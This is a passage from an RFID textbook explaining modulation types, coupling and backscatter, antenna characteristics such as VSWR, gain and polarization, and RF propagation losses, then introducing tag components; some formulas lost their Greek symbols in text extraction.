In the description of the modulation used for communication, some terms referring to 
different frequency bands are often used. A frequency band refers to a speciﬁ c range of 
frequencies. These terms are described as follows:
■ 
Baseband This is the range of frequencies of the original data signal before 
modulation.
■ 
Sideband This is the frequency band on either the higher side or the lower side of 
the carrier frequency band within which the frequencies produced by modulation fall.
■ 
Upper sideband (USB) This is the sideband above the carrier frequency.
■ 
Lower sideband (LSB) This is the sideband below the carrier frequency.

 
The Physics of RFID • Chapter 2 
27
As depicted in Figure 2.2, the information (data) is carried in the sidebands. In Chapter 1, 
you learned about the components of a wave: amplitude, frequency, and phase. You can ask a 
question now: For which of these components does the modulation vary (or change)? The 
answer is that you can change any of these components and accordingly there are several 
modulation techniques or types.
Understanding Modulation Types
Depending on which component of the wave is changed to encode data, there are different 
types of modulation, such as amplitude modulation, frequency modulation, and phase 
modulation.
Amplitude Modulation and 
Amplitude Shift Keying
Amplitude modulation (AM) is the technique in which the amplitude (peak-to-peak voltage) 
of the carrier wave is varied as a function of time in proportion to the strength of the data 
signal. As shown in Figure 2.3, the originally constant amplitude of the carrier signal rises 
and falls with each high and low of the data signal.

Chapter 2 • The Physics of RFID
In its basic form, amplitude modulation produces a signal with power concentrated at 
the carrier frequency and in two adjacent sidebands. Each of the two sidebands is equal in 
bandwidth to that of the modulating signal and is a mirror image of the other. This type of 
AM is called double sideband full carrier (DSBFC), meaning that you use the full power of 
both the sidebands and the carrier for transmission. This type is also called double sideband 
(DSB). There are two problems with this picture:
1. Only one of the two identical sidebands is needed; the other one is just a waste of 
power.
2. Half the power is concentrated at the carrier frequency, which carries no useful 
information.
The solution to this problem is to suppress the carrier, one of the sidebands, or both. 
This gives rise to several types of amplitude modulation:
■ 
Double-sideband reduced carrier transmission (DSB-RC) This type of 
modulation uses full power of both sidebands but reduces the carrier level 
(amplitude). To be precise, this is the type of AM achieved by implementing the 
following two requirements:
■ The frequencies produced by the modulation are symmetrically spaced 
above and below the carrier frequency.
■ The carrier level is reduced for transmission at a ﬁ xed level below, which is 
below the level of the carrier provided to the modulator.
■ 
Double-sideband suppressed-carrier transmission (DSB-SC) This is a special 
case of DSB-RC and is achieved by implementing the following two requirements:
■ Frequencies produced by amplitude modulation are symmetrically spaced 
above and below the carrier frequency.

■ The carrier level is reduced to the lowest practical level; ideally speaking, it’s 
completely suppressed.
■ 
Single-sideband (SSB) This is the type of AM in which only one sideband 
and the carrier is used. You can also call it single-sideband full carrier. Note that it is 
not necessary to transmit both sidebands: Either one can be suppressed at the 
transmitter without any loss of information. The advantages of SSB include 
smaller transmitter power, smaller bandwidth (one-half that of a DSB), and less 
noise at the receiver.
■ 
Single-sideband suppressed-carrier (SSB-SC) This is the SSB in which the 
carrier is suppressed. Even greater efﬁ ciency is achieved this way by completely 
suppressing both the carrier and sideband. This modulation type is widely used in 
amateur radio due to its efﬁ cient use of both power and bandwidth.
The less power to be transmitted by these AM types results in signiﬁ cantly less size, 
weight, and peak antenna voltage requirements of the SSB transmitter than those for the 
standard AM transmitter.
NOTE
In DSB-RC modulation, the carrier level is selected so that it is suitable 
for use as a reference by the receiver, except for the case in which it is 
reduced to the minimum practical level—for example, the carrier is 
suppressed.
The amplitude modulation is called amplitude shift keying, or ASK, when the data 
signal is a digital signal. The term keying is the legacy term from the times of telegraphy, 
when an operator would manually push keys to make short and long tones. The kind of 
keying we’re interested in refers to which characteristic of the analog carrier signal is to be 
varied to represent the ones and zeros of a digital data signal: amplitude, frequency, 
or phase.
ASK varies the amplitude of a carrier signal to represent binary data. The binary 
information is transmitted by assigning discrete amplitudes to bit patterns. For example, 
Figure 2.4 presents a simple example of ASK by showing the modulated signal corresponding 
to the digital signal that represents the binary number 0011010. Note that in the modulated 

30 
Chapter 2 • The Physics of RFID
signal, the period is the same for the entire signal; only the amplitude varies. In this example, 
an amplitude of 1 represents a 0, and the amplitude of 2 represents 1.
You can also encode data into the carrier signal by varying frequency instead of amplitude.
Frequency Modulation and 
Frequency Shift Keying
Frequency modulation (FM) is the modulation technique that represents information as 
variations in the frequency of the carrier wave, whereas in AM, the carrier amplitude is varied 
while its frequency remains constant. In analog applications, the carrier frequency is varied in 
direct proportion to changes in the amplitude of the data signal, as shown in Figure 2.5.

If the data signal is a digital signal, the FM technique is called frequency shift keying. In this case, 
the digital data is represented by shifting the carrier frequency among a set of discrete values.
So, FSK modulates the frequency of the carrier signal to represent data. The binary 
information is transmitted using different frequencies to represent bit patterns: one frequency 
represents one binary bit and a different frequency represents the other binary bit. Obviously, 
these frequencies lie within the bandwidth of the transmission channel.
Figure 2.6 presents a simple example of a modulated signal using FSK. The signal is 
representing the binary number 0011010.
NOTE
FM is most commonly used to transmit signals at VHF, whereas AM is most 
commonly used for transmitting audio signals (LF).

If, instead of varying amplitude or frequency, you vary the phase of the carrier wave to 
encode data signal, you are using phase modulation.

Chapter 2 • The Physics of RFID
Phase Modulation and Phase Shift Keying
Phase modulation (PM) is that kind of modulation in which information is represented by 
variations in the phase of the carrier wave. Unlike AM and FM, PM is not very widely used. 
When the data signal is a digital signal, the corresponding phase modulation technique is 
called phase shift keying.
So, phase shift keying is a technique that represents digital data by shifting the period 
of the carrier signal. The binary information is transmitted by assigning different phases to 
different bit patterns. Figure 2.7 presents a simple example of phase shift keying.
The binary signals can be represented in ways simpler than amplitude shift keying, 
frequency shift keying, or phase shift keying. After all, we are only talking about ways to 
represent two states: 1 and 0, or on and off.
On-Off Keying (OOK)
On-off keying (OOK) is a type of modulation in which the digital data is represented as the 
presence or absence of a carrier wave. For example, the presence of a carrier for a speciﬁ c 
duration represents a binary one, whereas the absence of the carrier for the same duration 
represents a binary zero. This technique is most commonly used to transmit Morse code over 
radio frequencies. It has also been used in the industrial, scientiﬁ c, and medical (ISM) radio 
bands to transfer data between computers. Figure 2.8 presents a simple example of on-off 
keying.

In this section, we explored the techniques to encode data into the carrier signal. Now 
the question is: How is the signal carrying the information transferred from the sender to 
the receiver?
RFID Communication Techniques
Communication is basically the transfer of information—that is, to send information from 
one location and to receive it at another. In the RF world, this is accomplished by the 
transfer of energy (which contains the information coded in it) through RF waves. There are 
two main communication techniques that the RFID readers and tags use to communicate 
with each other. These techniques are coupling and backscattering.
Communication Through Coupling
Coupling, in general, is the transfer of energy from one medium, such as a metallic wire or an 
optical ﬁ ber, to another similar medium. Some examples of coupling include capacitive 
(electrostatic) coupling and inductive (magnetic) coupling.

purposes.

Chapter 2 • The Physics of RFID
As explained in Chapter 1, inductive coupling is the process of transferring energy from 
one circuit to another through a shared magnetic ﬁ eld by virtue of the mutual inductance 
between the two circuits. Note the following points about inductive coupling:
■ 
Inductive coupling is used by low-frequency or high-frequency RFID systems. 
This way the tag and the reader can use a loop-style coil for an antenna because 
the traditional antenna would need to be too long due to the long wavelengths of 
the low-frequency waves.
■ 
Inductive coupling works only in the near ﬁ eld of the RF signal.
■ 
Sometimes inductive coupling is further subdivided into two kinds of coupling:
■ Close coupling within a range of about 1cm
■ Remote coupling within a range of about 1 cm to 1m
The power transfer between the two coils depends on the following quantities:
■ 
Operating frequency of the system
■ 
Number of turns/windings in the coils
■ 
Area enclosed by each coil
■ 
Angle the coils make with each other; for maximum power transfer, the coils 
should be aligned in the same plane
■ 
Distance between the two coils
The magnetic ﬁ eld can be used to transfer energy only within the short range. For 
long-range communication, you need to send information through EM waves (radiation). 
This technique used in RFID systems is called radiative coupling or backscattering.
Communication Through Backscattering
Backscattering is the process of collecting an inbound signal (energy), changing the signal (the 
data it carries), and reﬂ ecting it back to where it came from. The long-range RFID systems 
operating at ultra-high frequency (UHF) or microwave frequencies use this communication 
technique. The reader sends out the information in the form of an EM wave at a speciﬁ c 
frequency; the tag receives the wave, encodes the information into the wave (changes the 
wave), and scatters it back to the reader.
When you design and install a system, there is always a set of performance requirements 
that could differ from customer to customer. The antenna is an important component of an 
RFID system. Therefore it’s important to understand what constitutes and affects the 
performance of an antenna.

 
The Physics of RFID • Chapter 2 
35
Understanding Performance Characteristics 
of an RFID System
Radio devices communicate using antennas for transmitting and receiving the signals. Just 
like any other radio device, RFID tags and readers can also communicate with each other 
using antennas. The information is encoded into an RF wave and sent to the antenna 
through a transmission line. So, antennas play a vital rssole in an RFID system, and it is 
important to understand the characteristics of the transmission line and antennas that 
impact the performance. These characteristics are discussed in the following sections.
Cable Loss
RFID systems typically use 50-  coaxial cable as a transmission line. Cable loss is the 
amount of signal power lost in the cable. The longer the cable, the greater the loss.
Impedance
Impedance is deﬁ ned as resistance to the ﬂ ow of current in a circuit element and is measured 
as a ratio of voltage, say V, across the element and current, say I, through the element:
Z = V/I
The antenna receives power (in terms of current) from the source through the 
transmission line. The input impedance, Zi, for the antenna is the following:
Zi = Vi/Ii
Vi is the antenna input voltage, and Ii is the antenna input current.
To realize how impedance affects performance, note that the electromagnetic wave 
(power) travels through different parts of the antenna system, which can have different 
values for impedance. The parts to be considered here are the source that produces the 
power, the transmission line that brings the power to the antenna, and the antenna 
transmitter that transmits the power. The following are the different kinds of impedance 
deﬁ ned in this case:
■ 
Characteristic impedance This is the impedance of the transmission line, 
which is assumed to be lossless and of inﬁ nite length:
Zo = ( / )1/2
where  is the magnetic permeability of the medium that makes the 
transmission line and  is the electric permeability of the medium. An 
example of transmission line is the antenna cable.

36 
Chapter 2 • The Physics of RFID
■ 
Antenna input impedance The ratio of the input antenna voltage to the input 
antenna current.
■ 
Transmitter output impedance The impedance used by the antenna’s 
transmitter to transmit the power into the free space.
To get the best performance, it is important that all these impedances belonging to the 
different parts of an RFID system match with each other. If the antenna input impedance 
and the transmitter output impedance match the characteristic impedance of the transmission 
line, the antenna will radiate maximum power. However, there is always some impedance 
mismatch—for example, due to discontinuities in the transmission line or if the transmission 
line is terminated with other than its characteristic impedance. The impedance mismatch 
results in reﬂ ecting part of the wave energy back to the source and thereby impeding the 
performance. This phenomenon can be understood in terms of the voltage standing wave 
ratio.
The Voltage Standing Wave Ratio
A standing wave, also called a stationary wave, is a result of interference between two waves 
moving in the opposite direction. In an RFID system, this situation can arise due to the 
impedance mismatch along the transmission line from source to antenna transmitter. The 
impedance mismatch will result in reﬂ ecting part of the energy from the antenna back to 
the source, and the forward wave and the reﬂ ected wave will interfere with each other. Two 
cases for this interference are constructive and destructive, respectively:
■ 
Constructive interference This is the case when the crests of one wave coincide 
with the crests of the other wave, and therefore the amplitude of the resultant wave 
is the sum of the amplitudes of the interfering waves:
Vmax = Vf + Vr
■ 
Destructive interference This is the case when the crests of one wave line up 
with the troughs of the other wave, and therefore the amplitude of the resultant 
wave will be the difference of the amplitudes of the interfering waves:
Vmin = Vf – Vr
The voltage standing wave ratio, or VSWR, is measured as:
VSWR = Vmax / Vmin = (Vf + Vr)/(Vf – Vr) = (1 + Vr / Vf)/(1 + Vr / Vf) = (1 + )/(1 – )
where  = Vr/ Vf is the magnitude of what is called the reﬂ ection coefﬁ cient.
A perfect impedance match will result in a VSWR of 1:1, which is practically impossible. 
VSWR is always expressed with 1 as the denominator.

 
The Physics of RFID • Chapter 2 
37
So, VSWR is the ratio of maximum voltage to minimum voltage along the transmission 
line in a standing wave situation. Another characteristic that can affect performance is noise.
CAUTION
The impedance and VSWR are considered during the manufacturing process 
to produce the desired output according to the standards and regulations. 
Any adjustments made to the cable or antenna can cause the change in 
VSWR and in the transmitted power and may violate the standards.
Noise
Noise is an unwanted electrical wave (or energy) present in a circuit or a signal. It is called 
noise to the signal or a background. The effect of the noise is represented by a quantity 
called signal-to-noise ratio (SNR) and can be calculated as shown here:
SNR = (As/An)2
In this formula, As is the amplitude of the signal wave and An is the amplitude of the 
noise wave. SNR is usually represented in decibels:
SNR(dB) = 10 log (As / An)2 = 20 log (As / An)
This equation tells us that when the noise is stronger than the signal, the value of SNR 
will be negative, in which case reliable communication is not possible unless we either 
increase the signal strength or decrease the noise.
Conﬁ guring & Implementing…
What is the value of VSWR for a short circuit and for an open circuit?
Solution: In both cases, the VSWR = inﬁ nity:1.

38 
Chapter 2 • The Physics of RFID
Regardless of how strong the signal is compared to the noise, it’s useless unless the 
receiver receives it. Polarization is a characteristic that you should know in this context.
Beamwidth
As shown in Figure 2.9, the beamwidth of an antenna is the angle between the two half-power 
points around the point (the main lobe) that has the peak effective radiated power.

Show that each of the two half-power points of the beamwidth are 3dB below the 
point of maximum radiation.
Solution: By deﬁ nition, a half point has half the maximum radiation power. 
Therefore, the relative signal strength at a half-point can be expressed in decibels, as 
in the following:
10 × log(1/2) = −3 dB

 
The Physics of RFID • Chapter 2 
39
Why is beamwidth important? RFID systems are not broadcast systems. A reader wants 
to get information from a tag at a speciﬁ c location. So, the beam nature (focusing) of the 
radiated energy is important from the perspective of performance. We can talk about this 
issue in terms of directivity as well.
Directivity
The directivity of an antenna is deﬁ ned s its ability to focus in a particular direction to 
transmit or receive energy. Directivity is calculated as the ratio of the maximum value of 
power transmitted (or received) per unit of solid angle to the average power transmitted (or 
received) per unit of solid angle. This property is important in an RFID system because the 
communication in this case is point to point between a tag and a reader, as opposed to 
broadcast, as in the case of FM radio. Directivity is a performance characteristic in an RFID 
system because the performance depends on how well the reader and tag can direct their 
energy at each other.
NOTE
In an environment of poor directivity, a reader may end up reading a tag 
outside its zone. This is called a phantom read or a ghost read.
Antenna Gain
Antenna gain is another way of measuring an antenna’s ability to radiate in a speciﬁ c direction. 
This is measured as a ratio of energy radiated at a point of maximum radiation to energy 
radiated at the same point by some reference antenna:
Ag = Pout /Pref
One of the theoretical antennas used as a reference is called an isotropic 
(omnidirectional) antenna—that is, it radiates power uniformly in all directions. 
Therefore, the power radiated by the reference antenna can be taken as equal to the 
input power, assuming that the antenna is lossless. This would result in the following 
equation for the antenna gain:
Ag = Pout /Pin
Antenna gain is usually expressed in decibels:
Ag (dB) = 10 X log(Pout / Pin)

40 
Chapter 2 • The Physics of RFID
So, antenna gain is important because in an RFID system the power is transmitted in 
preferred directions and is not broadcast uniformly in all directions. For example, a reader 
wants to direct the power at the tag it wants to read. That’s why directivity and antenna gain 
are performance-related characteristics of antennas in RFID systems.
CAUTION
Don’t be misled by the term gain. The overall output (transmitted) power is 
not greater than the overall input power. Only the output power in a speciﬁ c 
direction is greater than some reference power in that direction. In other 
words, the antenna does not act as an ampliﬁ er.
Before an antenna can transmit power, it receives that power from the source through 
a transmission line. The characteristics of that transmission line (or the circuitry) are also 
important from the perspective of performance. One of those characteristics is impedance.
Polarization
As described in Chapter 1, the polarization of a transverse wave, such as an electromagnetic 
wave, refers to the direction of oscillations in the plane perpendicular to the direction in 
which the wave travels. The antenna of an RFID system emits electromagnetic waves into 
the free space. The polarization of the antenna refers to the direction of oscillations in these 
waves.
Based on polarization, there are two types of antenna:
■ 
Linearly polarized antennas Linear polarization is relative to the surface of the 
earth. It is of two kinds: horizontally polarized waves travel parallel to the surface of 
the earth, whereas vertically polarized waves travel perpendicular to the surface of 
the earth.
■ 
Circularly polarized antennas A circularly polarized wave basically spins as it 
travels.
Polarization is a performance characteristic because the readability of the tag greatly 
depends on the polarization of the antenna and the angle the tag makes with the reader. 
Here is how polarization affects performance:
■ 
For a maximum transfer of power, the reader and the tag antennas should have the 
same polarization.

 
The Physics of RFID • Chapter 2 
41
■ 
If the transmitting antenna is horizontally polarized and the receiving antenna is 
vertically polarized (or vice versa), not much power transfer is going to happen.
■ 
If the receiving antenna is circularly polarized, it will receive some radiation, 
regardless of the polarization of the transmitting antenna. This is because a circular 
polarization has both components of the linear polarization: horizontal and 
vertical.
The transmitter emits the energy (which contains the information) at a certain frequency, 
and the receiver that receives this energy is also tuned to a certain frequency. The performance 
can be optimized if the transmitter and the receiver resonate with each other.
Resonance Frequency
Due to the underlying physics principles, a system absorbs maximum energy when the 
frequency of the energy waves matches the system’s own natural frequency, the resonant 
frequency. Matching means the system’s frequency is the same as or an integral multiple of the 
frequency of the energy that’s being received. For optimal performance, it is important that 
the receiving antenna in an RFID system match the frequency of the incoming ﬁ eld—that 
is, it needs to resonate with the frequency of the incoming ﬁ eld. Typically, an antenna is 
tuned for a speciﬁ c frequency that matches the frequency of the incoming ﬁ eld, called 
resonant frequency or the base frequency. The integral multiples of this base frequency will also 
be effective frequencies for the antenna.
For example, if an antenna is tuned for a resonant frequency fr, it will be effective for 
frequencies such as 1fr, 2 fr, 3 fr, and 4 fr. Because frequency is inversely proportional to 
wavelength, the corresponding effective wavelengths will be , /2, /3, and /4. These 
wavelengths are also called the electrical length of the antenna and make their way into the 
antenna design as the antenna size.
NOTE
The low- and high-frequency tag antennas will need to be very large to 
resonate with the operating frequency. This is why these tags are designed 
to work on the principle of inductive coupling.
All the quantities discussed in this section directly or indirectly refer to the amplitude, 
voltage, or energy, all of which affect the power an antenna will radiate or absorb. This is 
because communication between two radio devices such as a reader and a tag is carried out 
by exchanging power between the antennas of the two devices. Therefore, it’s important to 
understand the physical quantities related to the power emitted by an antenna.

42 
Chapter 2 • The Physics of RFID
Performing Antenna Power Calculations
To understand an antenna’s performance, it’s important to know how an antenna radiates 
power. For example, an isotropic (omnidirectional) antenna radiates power uniformly in all 
directions, whereas a directional antenna radiates power in a speciﬁ c direction. The performance 
of an antenna related to the power it radiates can be understood in terms of three physical 
quantities: effective radiated power, power density, and link margin.
Effective Radiated Power
The effective radiated power (ERP) of an antenna in a speciﬁ c direction is the power that will need 
to be supplied to a reference antenna to produce the same power this antenna is producing in 
this direction. Therefore, by deﬁ nition of antenna gain, the ERP can be written as:
ERP = Pt  Ag
where Ag is the antenna gain and Pt is the total power transmitted by the antenna, which can 
be expressed in the following equation:
Pt = RF power — cable loss
After power is transmitted by an antenna, it spreads out into the space. Therefore, the 
power density (power per unit space) is an important quantity.
Power Density
An EM wave transmitted from an antenna travels in all directions in the form of an 
expanding spherical wavefront. The power density can be looked upon as the power of this 
wave per unit of surface area of the sphere. The surface area of a sphere with radius R is 
4 R2. Therefore, the power density, Pd, at a distance R from the transmitter antenna can be 
calculated using the following formula:
Pd = Pt /(4 R
2)
Pt is the total power radiated by the antenna. This formula works for the power being 
emitted by an isotropic antenna. If the antenna is a directional antenna, we need to take into 
account the antenna gain, and the formula used to calculate the power density is as follows:
Pd = EPR / (4 R
2) = (Pt X Ag) / (4 R
2)
Once the antenna has radiated energy, bad things, in addition to the natural spreading 
out, can happen to it while it’s on its way to the destination. For example, it may be absorbed 
or reﬂ ected back by some materials on its way. ERP does not account for what happens to 
the energy wave on its way to the destination and how it is received by the receiving 
antenna. However, the overall system performance depends on how much power is 

 
The Physics of RFID • Chapter 2 
43
being transferred between the transmitter and the receiver. The quantity that includes the 
travel and the receiving part of communication is called link margin.
Link Margin
Link margin quantiﬁ es the performance of the overall RFID communication system, including 
the transmitting antenna and the receiving antenna. The link margin, Lm, can be deﬁ ned as:
Lm = (ERPr / Pmin) = (ERPt  Arg) / Pmin = (Pt  Atg  Arg) / Pmin
Lm(dB) = 10  log ((Pt  Atg  Arg) / Pmin) = 10  (log Pt + log Atg + log Arg  - log Pmin)
where:
 Pt = Transmitted power
 Atg = Gain for transmitter antenna
 Arg = Gain for receiving antenna
 Pmin = Minimum received signal strength
Looking at this equation, you can realize that link margin is the ratio of the maximum 
effective signal strength received to the minimum signal strength received. In RFID, it means 
the amount of power that a tag can extract from the RF signal before the communication 
between the tag and the reader weakens.
So, the link margin takes into account the impacts of both the transmitting antenna and 
the receiving antenna. It also includes the factor of minimum received signal strength. The 
received signal strength varies and is less than the transmitted signal strength due the 
interaction of the signal with the medium through which it travels.
The Travel Adventures of RF Waves
When an RF wave travels from the transmitter to the receiver, it can be affected by various 
factors discussed in the following sections.
Absorption
When an RF wave strikes a material object, some of its energy will be absorbed by the 
object, depending on the frequency of the wave and the material of the object. Water and 
objects containing water, such as liquid products, wood, and food, are especially good at 
absorbing RF waves. UHF waves, due to their shorter wavelengths, are more susceptible 
to absorption than LF and HF waves.

44 
Chapter 2 • The Physics of RFID
Attenuation
Attenuation in general means a decrease in the amount of something. In RF physics, it 
means the decrease in amplitude (strength) of the RF signal (wave). Attenuation is the 
opposite of ampliﬁ cation. It can occur when the signal is traveling from the source to the 
antenna through the transmission line or during propagation from the transmitter antenna 
to the receiver antenna. It can occur due to a number of reasons, such as absorption and 
dispersion.
Dielectric Effects
Dielectric effects refer to a medium’s capacity to retain charge. As a result, an electromagnetic 
wave traveling through a dielectric medium is slowed down. The strength of this effect is 
measured by a quantity called the dielectric constant whose value is different for different 
materials. Dielectric effects also detune the signal—that is, shift its frequency to a value that 
is not in resonance with the frequency for which the antenna is tuned.
Diffraction
Diffraction refers to the bending of an EM wave when it strikes the sharp edges or when it 
passes through narrow gaps. Due to diffraction, the receiver antenna will not receive the 
wave energy that it would have otherwise.
Free Space Loss
If the space through which the RF wave travels is free of all obstructing material and as a result 
there are no affects such as absorption, reﬂ ection, refraction, and scattering, there will still be 
some loss in signal strength, called free space loss (FSL). This loss occurs simply due to the way a 
wave travels. An RF wave transmitted from a source travels in all directions in the form of an 
expanding sphere (called a wavefront), and therefore the power density (power per unit of surface 
area of this sphere) decreases as a result of this spreading out. If R is the distance from the 
transmitter antenna, the surface area of the sphere with radius R around the antenna is 4 R2. 
Therefore, the power density (and hence the signal strength) of a propagating wave at a point in 
space is inversely proportional to the square of distance of this point from the transmitter 
antenna. In other words, the free space loss will be directly proportional to the square of this 
distance. In addition, the loss is inversely proportional to the square of the wavelength of the 
propagating wave.

 
The Physics of RFID • Chapter 2 
45
The FSL is measured using the following equation:
FSL = (4 Rk / )
2
FSL (dB) = 10 log (4 Rk / )
2 = 10 log (4 Rfk /c)
2 = 20 log (4 k / c) + 20 log R + 20 log f
=>
FSL (dB) = 20 log R = 20 log  + K
where:
K = 20 log (4 k / c)
and k is a constant that depends on the communication link and the units used for distance 
and wavelength.
Interference
Interference is the interaction between two waves. The signal wave can interact with other 
waves that it meets on the way to its destination. A resultant wave is produced as a result of 
interference, and the receiver receives the resultant wave. The interference can be constructive, 
in which case the resultant wave has a larger amplitude, or destructive, in which case the 
resultant wave has a smaller amplitude than the original wave.
Reﬂ ection
Reﬂ ection is the abrupt change in direction of a wavefront at an interface between two 
dissimilar media so that the wavefront returns into the medium from which it hit the 
interface. Radio waves are reﬂ ected when they strike objects much larger than the wave, 
such as ﬂ oor, ceiling, and support beam. Metals are obstructions to the signal because they 
are good at reﬂ ecting RFID waves.
Refraction
Refraction is the change in direction of a wavefront at an interface between two dissimilar 
media, but the wavefront does not return to the medium from which it hit the interface. 
In other words, the radio waves bend when they pass from one medium into another.

Scattering
Scattering is the phenomenon of absorbing a wave and reradiating it, thereby changing its 
direction. For example, reﬂ ection of an EM wave is actually a scattering. When a RF wave 
is scattered, it results in the loss of the signal or dispersion of the wave, as shown in 
Figure 2.11. It happens due to the interaction of the wave with the medium at the 
molecular level.

The three most important takeaways from this chapter are the following:
■ 
The source encodes data (information) into the carrier signal using a modulation 
technique and sends it to the antenna through a transmission line. The input antenna 
impedance must match with the characteristic impedance of the transmission 
line to achieve optimal results.
■ 
The antenna transmits the modulated carrier signal (carrying the information) 
into the free space. The polarizations and orientations of the transmitting and 
receiving antennas should be consistent with each other to maximize energy 
transfer.
■ 
The hazards on the way from transmitting antenna to receiving antenna may affect 
the communication in a negative way. These hazards either weaken the wave by, 
for example, absorbing its energy or change its direction by, for example, 
reﬂ ecting it.

Chapter 2 • The Physics of RFID
Summary
The readers and tags in an RFID system communicate with each other through RF waves. 
Encoding the data (to be communicated) into an RF wave (carrier signal), the emission of 
the RF wave by antennas, and the propagation of the RF waves between the antennas are 
governed by underlying physics principles. The data is encoded into the RF wave using 
modulation techniques. From performance viewpoint, there are two main factors in the 
RFID communication: the strength of the signal and the direction of the signal. In other 
words, you must understand all the characteristics that result in either the loss of power in 
the signal or the change of direction of the signal. For example, cable loss, impedance, and 
voltage standing wave ratio (VSWR) are important factors that affect how strong a signal 
antenna gets from the source through the transmission line. Because readers are directing 
their signal at the tags, the antennas used in RFID systems are directional antennas. 
Therefore, directivity, antenna gain, and polarization are important physical quantities that 
impact the performance of antennas.
Once the antenna radiates the RF waves into the free space, performance indicates how 
intact it will reach its destination. This part of the performance depends on factors such as 
absorption, reﬂ ection, refraction, and scattering. Water is a good absorber, and metals are good 
reﬂ ectors. RFID systems typically use two kinds of communication technique: inductive 
coupling to communicate within the near ﬁ eld and backscattering to communicate in the far 
ﬁ eld. Inductive coupling is used by RFID systems operating at LF and HF because the high 
wavelengths corresponding to these high frequencies will require ridiculously large antennas.
Most of the physics behind RFID relates to how readers and tags communicate with 
each other. In the next chapter, we discuss tags in greater detail.

Chapter 3 • Working with RFID Tags
Introduction
The items that you need to identify and track are tagged with, well, tags. So, a tag is the 
“better half” of the RFID system because it contains information about the item to which it 
is attached and has the capability to provide that information on request. A tag makes it to 
the item in three steps: The tag with the basic functionality is manufactured, the tag is turned 
into a label, and the label is placed on the item. From your perspective, this process involves 
the following facts:
■ 
All the tags are composed of the same basic components because they offer the 
same basic functionality: to help identify and track an item.
■ 
To meet the varied needs of different applications, tags come in different forms, 
shapes, and sizes.
■ 
Tags must be properly placed on items so that they could be easily read by readers.
So, the main goal of this chapter is to understand the role of a tag in an RFID system. To 
accomplish this goal, we will explore three avenues: tag components, tag types, and tag placement.
Understanding Tags
Generally speaking, RFID is a means to identify an object using radio frequency 
transmission, which suggests that communication is involved in the identiﬁ cation process. 
The communication takes place between a reader and a tag. A tag, attached to an item that 
needs to be tracked, contains identiﬁ cation and possibly more information about the item. 
For example, in a supply-chain system, a tag may contain the following information about 
an item: source, destination, and route.
You need to know what makes a tag—that is, its components—and what it looks like, 
including its size and shape.
Components of a Tag
The components of a tag are there to support its functionality by:
■ 
Storing the information about an item
■ 
Processing the request for information coming in from a reader
■ 
Preparing and sending the response to the request

 
Working with RFID Tags • Chapter 3 
53
To support this functionality, a tag, as shown in Figure 3.1, consists of the following three 
main components:
■ 
Chip The chip is used to generate or process a signal. It’s an integrated circuit (IC) 
made of silicon. The chip consists of the following functional components:
■ Logical unit Implements the communication protocol used for tag-reader 
communication.
■ Memory Used to store data (information).
■ Modulator Used for modulating the outgoing signals and demodulating 
the incoming signals.
■ Power controller Converts the AC power from the incoming signal to 
DC power and supplies power to the components of the chip.
The chip is connected to the antenna so that it can send the outbound 
signal to the antenna and can receive the inbound signal from the antenna.
■ 
Antenna In an RFID system, a tag’s antenna receives the signal (a request for 
information) from a reader and transmits a response signal (identiﬁ cation information) 
back to the reader. It’s made of metal or a metal-based material. Both readers and 
tags have their own antennas. You learned about antennas in Chapters 1 and 2, and 
you will learn more details about them in Chapter 6. In this chapter, it is sufﬁ cient 
to know that a tag’s antenna radiates and receives radio waves to transmit and 
receive a radio signal. Furthermore, note the following two points:
■ The antennas are usually used by tags (and readers as well) operating at 
UHF and microwave frequencies.
■ The tags (and readers) operating at LF and HF use inductive coils (as antennas) 
to send and receive signals in the inductive coupling communication 
technique. As you know from Chapter 2, the size of a traditional antenna for 
sending or receiving an LF signal would need to be ridiculously high due to 
the high wavelengths of these signals.
Both the chip and antenna are housed on a substrate.

54 
Chapter 3 • Working with RFID Tags
CAUTION
Note two important points: Both readers and tags have antennas, and a tag 
(and a reader) that uses inductive coupling as its communication technique 
uses an inductive coil for an antenna instead of a standard antenna
■ 
Substrate This is the layer that houses the chip and the antenna. In other 
words, it’s the support structure for the tag. Substrates can be made of different 
materials such as plastic, polyethylene terephthalate (PET), paper, and glass 
epoxy. Substrate material can be rigid or ﬂ exible, depending on the usage 
requirements.
Substrates for RFID tags are designed to meet speciﬁ c usage requirements 
such as the following:
■ Dissipation of static charge buildup
■ Durability under speciﬁ c operating conditions
■ Mechanical protection for chip, antenna, and connections
■ Smooth printing surface
So, a tag consists of a chip and an antenna housed on a substrate. Now this thing is going 
to be attached to an item, so a natural question to ask is: How big is a tag? In other words, 
depending on the item to which a tag will be applied, tag size matters.

Tag Size
The preferred tag size might depend on the item on which the tag will be applied and 
the environment in which the item exists. To meet the varied requirements of different 
applications, tags come in various shapes and sizes. Here are some examples:
■ 
Large tags that are several inches in length, width, and height can be used to track 
large objects such as vehicles like trucks and rail cars.
■ 
Rectangular shaped tags can be used as antitheft devices.
■ 
Thin tags can be applied under a paper or plastic label on individual items such as 
books or packages such as boxes.
■ 
Screw-shaped tags can mark and track speciﬁ c trees.
■ 
Inserting tags the size of a pencil lead (less than half an inch in length) under the 
skin can help track animals.
The smallness of a tag is limited by the antenna size. To select the right tag for a given 
environment, you must understand the tag types and operating frequencies.
Operating Tag Frequencies
To respond to readers, tags use radio waves, which are basically the electromagnetic waves 
covering part of the electromagnetic spectrum of frequencies called radio frequency spectrum. 
Because the RFID systems generate and radiate the electromagnetic waves that fall in the 
radio frequency spectrum, they are justiﬁ ably classiﬁ ed as radio systems. However, other 
radio services have been operating before the arrival of RFID systems. Radio, television, 
mobile radio services (police, security services, and industry), marine and aeronautical radio 
services, and mobile telephones are a few. Therefore, it is important to ensure that these 
services are not disrupted or impaired by the RFID newcomers. This requirement signiﬁ -
cantly restricts the suitable operating frequency ranges available for RFID systems. 
Therefore, the so-called industrial, scientiﬁ c, and medical (ISM) frequencies, originally 
reserved for noncommercial uses in industrial, scientiﬁ c, and medical ﬁ elds, are generally 
used for RFID systems.
Table 3.1 shows the radio frequency ranges that are of interest to RFID systems, along 
with the ISM frequencies. RFID systems use many different frequencies in the radio 
frequency spectrum, but there are four most commonly used radio frequency ranges: low 
frequency (30–300 KHz), high frequency (3–30 MHz), ultrahigh frequency (300 MHz–3 GHz), 
and microwave frequencies (1 GHz–300 GHz).

56 
Chapter 3 • Working with RFID Tags
Table 3.1 also shows the read ranges for a passive tag (a tag that does not have its own 
source of power, such as battery) corresponding to each frequency range. An active tag 
(a tag that has a battery) can have a read range of up to 100 meters. For example, active tags 
used on large assets such as cargo containers, rail cars, and large reusable containers, which 
